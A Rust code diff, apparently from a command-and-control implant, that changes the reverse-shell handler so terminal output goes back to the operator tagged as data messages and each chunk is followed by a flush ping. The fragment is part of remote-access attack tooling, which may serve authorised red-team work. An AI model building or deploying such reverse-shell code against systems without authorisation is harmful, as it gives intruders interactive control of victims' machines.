@@ -1,6 +1,6 @@
 use super::Dispatcher;
 use anyhow::Result;
-use pb::c2::{ReverseShellRequest, ReverseShellResponse};
+use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse};
 use portable_pty::{native_pty_system, CommandBuilder, PtySize};
 use std::sync::mpsc::channel;
 use transport::Transport;
@@ -76,8 +76,9 @@ impl Dispatcher for ReverseShellMessage {
 
                 match output_tx
                     .send(ReverseShellRequest {
-                        task_id,
+                        kind: ReverseShellMessageKind::Data.into(),
                         data: buffer[..n].to_vec(),
+                        task_id,
                     })
                     .await
                 {
@@ -90,7 +91,27 @@ impl Dispatcher for ReverseShellMessage {
                     }
                     Err(_err) => {
                         #[cfg(debug_assertions)]
-                        log::info!("failed to queue tty output: {}", _err);
+                        log::error!("failed to queue tty output: {}", _err);
+
+                        break;
+                    }
+                }
+
+                // Force the channel to be flushed
+                match output_tx
+                    .send(ReverseShellRequest {
+                        kind: ReverseShellMessageKind::Ping.into(),
+                        data: Vec::new(),
+                        task_id,
+                    })
+                    .await
+                {
+                    Ok(_) => {}
+                    Err(_err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("tty output ping failed: {}", _err);
+
+                        break;
                     }
                 }
             }
